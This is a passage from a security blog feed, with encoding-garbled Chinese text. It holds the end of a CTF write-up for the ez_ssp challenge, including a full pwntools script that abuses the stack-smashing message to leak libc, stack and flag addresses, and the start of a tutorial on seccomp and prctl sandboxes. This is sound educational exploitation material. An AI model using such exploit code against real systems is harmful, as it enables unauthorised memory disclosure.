src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp14.png" alt="åä¸ºæ¯2023-ez_ssp14.png"></p><p>åœ¨æ ˆä¸­å¯ä»¥è¿›è¡ŒéªŒè¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="åä¸ºæ¯2023-ez_ssp15.png"></p><p>å¾€ä¸Šç¿»å¯ä»¥çœ‹åˆ° flag å­˜å‚¨çš„ä½ç½®</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp16.png" alt="åä¸ºæ¯2023-ez_ssp16.png"></p><p>è®¡ç®—æ ˆä¸Šç¯å¢ƒå˜é‡çš„é¦–åœ°å€ä¸ flag å­˜å‚¨ä½ç½®ä¹‹é—´çš„åç§»</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp17.png" alt="åä¸ºæ¯2023-ez_ssp17.png"></p><p>å› æ­¤ <code>flag_addr = stack_addr - 0x178</code></p><p>ç¬¬ä¸‰æ¬¡å¾ªç¯æˆ‘ä»¬ç›´æ¥å°† <code>__libc_argv[0]</code> è¦†ç›–ä¸º <code>flag_addr</code>ï¼Œå°† flag æ‰“å°å‡ºæ¥</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp18.png" alt="åä¸ºæ¯2023-ez_ssp18.png"></p><p>ä¸è¿‡è¿™é‡Œçš„ flag æ˜¯åŠ å¯†åçš„ï¼Œæˆ‘ä»¬å†å°†å…¶å¼‚æˆ–è¿˜åŸå³å¯</p><p>ç”±äºå¼‚æˆ–çš„å‚æ•°ä¸éšæœºæ•°æœ‰å…³ï¼Œè®°å¾—å°† <code>random id</code> è®°å½•ä¸‹æ¥ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp19.png" alt="åä¸ºæ¯2023-ez_ssp19.png"></p><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/opt/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ç”¨ read_got_addr è¦†ç›– __libc_argv[0] æ³„éœ² read å‡½æ•°çš„çœŸå®åœ°å€</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"read_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® read å‡½æ•°çš„çœŸå®åœ°å€è®¡ç®— libc åŸºåœ°å€ï¼ŒåŒæ—¶å¾—åˆ° environ çš„çœŸå®åœ°å€</span>libcbase <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"environ_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ç”¨ environ çš„çœŸå®åœ°å€è¦†ç›– __libc_argv[0] æ³„éœ²æ ˆä¸Šç¯å¢ƒå˜é‡çš„é¦–åœ°å€</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ç”±äºæ ˆä¸Šç¯å¢ƒå˜é‡çš„é¦–åœ°å€ä¸ flag åœ¨æ ˆä¸Šçš„ä½ç½®ç›¸è· 0x178ï¼Œè®¡ç®— flag åœ¨æ ˆä¸Šçš„çœŸå®åœ°å€</span>flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x178</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ç”¨ flag åœ¨æ ˆä¸Šçš„çœŸå®åœ°å€è¦†ç›– __libc_argv[0] æ³„éœ²åŠ å¯†åçš„ flag</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Your random id is: '</span><span class="token punctuation">)</span><span class="token comment"># ç”±äº flag çš„åŠ å¯†ä¸ç”Ÿæˆçš„éšæœºæ•°æœ‰å…³ï¼Œæ³¨æ„åˆ°è¿™ä¸ªéšæœºæ•°æ˜¯ä¸å˜çš„ï¼Œè·å–éšæœºæ•°</span>random <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random id -->"</span><span class="token punctuation">,</span> random<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>flag_enc <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_enc -->"</span><span class="token punctuation">,</span> flag_enc<span class="token punctuation">)</span><span class="token comment"># flag çš„åŠ å¯†æ˜¯ç®€å•çš„å¼‚æˆ–ï¼Œå› æ­¤å¼‚æˆ–è§£å¯†è¿˜åŸ flag</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag_enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> random<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp20.png" alt="åä¸ºæ¯2023-ez_ssp20.png"></p>]]></content>
    
    
    <summary type="html">åˆ©ç”¨ SSP Leak ç»•è¿‡ Canaryï¼Œé€šè¿‡ä¿®æ”¹ __fortify_fail å‡½æ•°ä¸­è¦è¾“å‡ºçš„å˜é‡ __libc_argv[0] çš„åœ°å€ï¼Œæ•…æ„è§¦å‘ Canary ä¿æŠ¤æ¥å®ç°ä»»æ„åœ°å€è¯»</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>æ²™ç®±ç»•è¿‡ä¸ORW</title>
    <link href="https://www.uf4te.cn/posts/7a9990fc.html"/>
    <id>https://www.uf4te.cn/posts/7a9990fc.html</id>
    <published>2024-05-12T02:53:41.000Z</published>
    <updated>2024-06-05T06:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ²™ç®±"><a href="#æ²™ç®±" class="headerlink" title="æ²™ç®±"></a>æ²™ç®±</h1><blockquote><p>æ²™ç®±æŠ€æœ¯æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç›®çš„åœ¨äºä¸ºæ‰§è¡Œä¸­çš„ç¨‹åºæä¾›éš”ç¦»ç¯å¢ƒï¼Œå¯ä»¥å°†æ²™ç®±ç†è§£ä¸ºæ˜¯ä¸€ä¸ªè™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼Œå®ƒåˆ›é€ äº†ä¸€ä¸ªç±»ä¼¼æ²™ç®±çš„ç‹¬ç«‹ä½œä¸šç¯å¢ƒï¼Œå¹¶ä¸”ä¼šæŠŠæ‰€æœ‰æ“ä½œè®°å½•ä¸‹æ¥ï¼Œåœ¨å…¶å†…éƒ¨è¿è¡Œçš„ç¨‹åºå¹¶ä¸èƒ½å¯¹ç¡¬ç›˜äº§ç”Ÿæ°¸ä¹…æ€§çš„å½±å“</p><p>æ²™ç®±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿç¯å¢ƒï¼Œé€šè¿‡æ‹¦æˆªç³»ç»Ÿè°ƒç”¨ï¼Œç›‘è§†ç¨‹åºè¡Œä¸ºï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºæˆ–ä¸Šç½‘è¡Œä¸º</p></blockquote><hr><h2 id="æ²™ç®±å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«"><a href="#æ²™ç®±å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«" class="headerlink" title="æ²™ç®±å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«"></a>æ²™ç®±å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«</h2><blockquote><p>ä»è¡¨é¢å’Œç›®çš„ä¸Šæ¥çœ‹ï¼Œæ²™ç®±æœ‰ç‚¹ç±»ä¼¼äºç‰©ç†ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„å…³ç³»ï¼Œä½†æ˜¯å®ƒä»¬ä¹‹é—´å¹¶ä¸å®Œå…¨ç­‰ä»·</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/syy15270341019/article/details/133036033">æ²™ç®±å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«-CSDNåšå®¢</a></p></blockquote><ul><li>æ²™ç®±</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW1.png" alt="æ²™ç®±ç»•è¿‡ä¸ORW1.png"></p><ol><li><p>æ²™ç®±æ˜¯åœ¨ç°æœ‰çš„ç³»ç»Ÿä¸‹ï¼Œè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿå’Œæ³¨å†Œè¡¨ï¼Œé€šè¿‡åº•å±‚é©±åŠ¨è™šæ‹Ÿç¡¬ç›˜ç­‰æ“ä½œï¼Œè®©ä½ åœ¨è™šæ‹Ÿçš„è½¯ä»¶ç¯å¢ƒä¸­è¿è¡Œåº”ç”¨ç¨‹åº</p></li><li><p>æ²™ç®±ä¸­çš„åº”ç”¨ç¨‹åºå’Œå…¶å®ƒåº”ç”¨ç¨‹åºå…±äº«æœºå™¨çš„ç¡¬ä»¶èµ„æºï¼Œå¯¹ç³»ç»Ÿèµ„æºæ¶ˆè€—è¾ƒå°‘</p></li><li><p>å½“æ²™ç®±ä¸­çš„åº”ç”¨ç¨‹åºé€€å‡ºåï¼Œå…¶æ‰€åšçš„æ›´æ”¹ä¼šè¢«ä¸¢å¼ƒ</p></li><li><p>æ²™ç®±åœ¨è¿›è¡Œè½¯ä»¶æµ‹è¯•æ—¶ï¼Œæ²™ç®±ä¼šæ¥ç®¡ç—…æ¯’è°ƒç”¨æ¥å£æˆ–å‡½æ•°çš„è¡Œä¸ºï¼Œå¹¶ä¼šåœ¨ç¡®è®¤ä¸ºç—…æ¯’è¡Œä¸ºåå®è¡Œå›æ»šæœºåˆ¶ï¼Œè®©ç³»ç»Ÿå¤åŸ</p></li><li><p>æ²™ç®±ä¸€èˆ¬æ¥è¯´æ˜¯ä¸èƒ½è¿è¡Œéœ€è¦é©±åŠ¨åŠ è½½çš„è½¯ä»¶çš„</p></li></ol><ul><li>è™šæ‹Ÿæœº</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW2.png" alt="æ²™ç®±ç»•è¿‡ä¸ORW2.png"></p><ol><li><p>è™šæ‹Ÿæœºæ˜¯é€šè¿‡è½¯ä»¶æ‰‹æ®µè™šæ‹Ÿè®¡ç®—æœºçš„ç¡¬ä»¶è®¾å¤‡ï¼Œåœ¨ç°æœ‰çš„ç³»ç»Ÿä¸‹å»ºç«‹ä¸€ä¸ªå…¨æ–°çš„ç³»ç»Ÿç¯å¢ƒï¼Œåœ¨æ²¡æœ‰è¿›è¡Œè®¾ç½®å‰ï¼Œè¯¥ç³»ç»Ÿç¯å¢ƒæ— æ³•ä¸ç°æœ‰ç³»ç»Ÿç›¸äº’è®¿é—®</p></li><li><p>è™šæ‹Ÿæœºä¸å’Œå…¶å®ƒåº”ç”¨ç¨‹åºå…±äº«ç¡¬ä»¶èµ„æºï¼Œå› æ­¤è™šæ‹Ÿæœºå¯¹ç³»ç»Ÿèµ„æºæ¶ˆè€—è¾ƒå¤§</p></li><li><p>å½“è™šæ‹Ÿæœºé€€å‡ºåï¼Œå…¶æ‰€åšçš„æ›´æ”¹ä¼šè¢«ä¿å­˜ä¸‹æ¥</p></li><li><p>è™šæ‹Ÿæœºä¸å…·å¤‡å›æ»šå¤åŸæœºåˆ¶ï¼Œåœ¨æ¿€å‘ç—…æ¯’åï¼Œè™šæ‹Ÿæœºä¼šæ ¹æ®ç—…æ¯’çš„è¡Œä¸ºç‰¹å¾åˆ¤æ–­ä¸ºæ˜¯æŸä¸€ç±»ç—…æ¯’ï¼Œå¹¶è°ƒç”¨å¼•æ“å¯¹è¯¥ç—…æ¯’è¿›è¡Œæ¸…é™¤</p></li><li><p>Â è™šæ‹Ÿæœºå¯ä»¥è¿è¡Œåœ¨æ­£å¸¸ç³»ç»Ÿä¸‹å¯ä»¥è¿è¡Œçš„è½¯ä»¶ï¼Œå®ƒå¯ä»¥äº«æœ‰å±äºè‡ªèº«çš„é©±åŠ¨ç¨‹åº</p></li></ol><blockquote><p>ç›¸å¯¹æ¥è¯´ï¼Œè™šæ‹Ÿæœºçš„å®‰å…¨æ€§æ›´é«˜ã€æŠ€æœ¯æ¯”è¾ƒç¨³å®šï¼Œå¾ˆå°‘æœ‰ç—…æ¯’å¯ä»¥æ”»ç ´è™šæ‹Ÿæœºä½¿ä¸»æœºä¸­æ¯’</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè™šæ‹Ÿæœºçš„ç”¨é€”æ›´å¹¿æ³›</p></blockquote><hr><h2 id="æ²™ç®±ä¿æŠ¤çš„ç§ç±»"><a href="#æ²™ç®±ä¿æŠ¤çš„ç§ç±»" class="headerlink" title="æ²™ç®±ä¿æŠ¤çš„ç§ç±»"></a>æ²™ç®±ä¿æŠ¤çš„ç§ç±»</h2><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12787?time__1311=mqmhDvrxkG8D/D0lD2DUh9Cr4cC+eD&alichlgref=https://www.google.com/">æ ˆæ²™ç®±å­¦ä¹ ä¹‹orw - å…ˆçŸ¥ç¤¾åŒº</a></p></blockquote><p>åœ¨ç¨‹åºä¸­é€šå¸¸ä¼šä½¿ç”¨ä¸€ä¸ªå‡½æ•°æ¥åˆ›å»ºæ²™ç®±ï¼Œä¾‹å¦‚ä½¿ç”¨Â <code>sandbox()</code>Â å‡½æ•°å¼€å¯æ²™ç®±ä¿æŠ¤</p><p><code>sandbox()</code>Â å‡½æ•°é€šå¸¸æœ‰ä¸¤ç§æ–¹å¼å¼€å¯æ²™ç®±ï¼š<code>prctl</code> å‡½æ•°è°ƒç”¨ã€<code>seccomp</code> åº“å‡½æ•°</p><blockquote><p>æ²™ç®±ä¿æŠ¤ä¸€èˆ¬éƒ½ä¼šé™åˆ¶Â <code>execve</code>Â çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚Â <code>one_gadget</code>Â å’ŒÂ <code>system</code>Â è°ƒç”¨ï¼Œä½¿æˆ‘ä»¬ä¸èƒ½æ­£å¸¸Â <code>get shell</code>ï¼Œåªèƒ½é€šè¿‡ ROP è°ƒç”¨Â <code>open()</code>ã€<code>read()</code>ã€<code>write()</code>Â çš„ç»„åˆæ–¹å¼æ¥è·å– flag</p><p>å½“ç„¶ï¼Œä¸ºäº†æé«˜éš¾åº¦ï¼Œæœ‰æ—¶å€™Â <code>open()</code>ã€<code>read()</code>ã€<code>write()</code>Â çš„ç»„åˆä¹Ÿä¼šè¢«éƒ¨åˆ†ç¦ç”¨</p></blockquote><ul><li>ä½¿ç”¨Â <code>prctl()</code>Â æ–¹å¼å¼€å¯çš„æ²™ç®±</li></ul><p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token keyword">int</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> option<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg4<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg5<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦å…³æ³¨ <code>prctl()</code> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ<code>option</code> çš„å€¼ä»£è¡¨è¢«ç¦ç”¨çš„å‡½æ•°é»‘åå•</p><ol><li><code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code></li></ol><p>å½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 38 æ—¶ï¼Œè¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨</p><p>ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º 1ï¼Œåˆ™ç¦ç”¨ execve ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹å­è¿›ç¨‹åŒæ ·ç”Ÿæ•ˆ</p><ol start="2"><li><code>prctl(22ï¼Œ2, &amp;v1)</code></li></ol><p>å½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 22 æ—¶ï¼Œè¡¨ç¤ºè®¾ç½®æ²™ç®±è§„åˆ™ï¼Œä»è€Œå¯ä»¥å®ç°æ”¹å˜å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨</p><p>ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º 1ï¼Œåªå…è®¸è°ƒç”¨ <code>read</code>ã€<code>write</code>ã€<code>_exit(not exit_group)</code>ã€<code>sigreturn</code> è¿™å‡ ä¸ª <code>syscall</code></p><p>ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º 2ï¼Œè¿‡æ»¤æ¨¡å¼ï¼Œé€šè¿‡å‚æ•° 3 çš„ç»“æ„ä½“è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™æ¥å¯¹ <code>syscall</code> è¿›è¡Œé™åˆ¶</p><ul><li>ä½¿ç”¨ <code>seccomp()</code> å‡½æ•°è°ƒç”¨å¼€å¯çš„æ²™ç®±</li></ul><p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token comment">// è¿™é‡Œä»‹ç»ä¸¤ä¸ªé‡è¦çš„å®ï¼ŒSCMP_ACT_ALLOW(0x7fff0000U) å’Œ SCMP_ACT_KILL( 0x00000000U)</span>  <span class="token comment">// seccomp åˆå§‹åŒ–ï¼Œå‚æ•°ä¸º 0 è¡¨ç¤ºç™½åå•æ¨¡å¼ï¼Œå‚æ•°ä¸º 0x7fff0000U åˆ™ä¸ºé»‘åå•æ¨¡å¼</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// seccomp_rule_add æ·»åŠ è§„åˆ™</span>  <span class="token comment">// v1 å¯¹åº”ä¸Šé¢åˆå§‹åŒ–çš„è¿”å›å€¼</span>  <span class="token comment">// 0x7fff0000 å³å¯¹åº”å® SCMP_ACT_ALLOW</span>  <span class="token comment">// ç¬¬ä¸‰ä¸ªå‚æ•°ä»£è¡¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œ0-->read / 1-->write / 2-->open / 60-->exit</span>  <span class="token comment">// ç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦éœ€è¦å¯¹å¯¹åº”ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°åšå‡ºé™åˆ¶ä»¥åŠæŒ‡ç¤ºåšå‡ºé™åˆ¶çš„ä¸ªæ•°ï¼Œä¼  0 ä¸åšä»»ä½•é™åˆ¶</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span 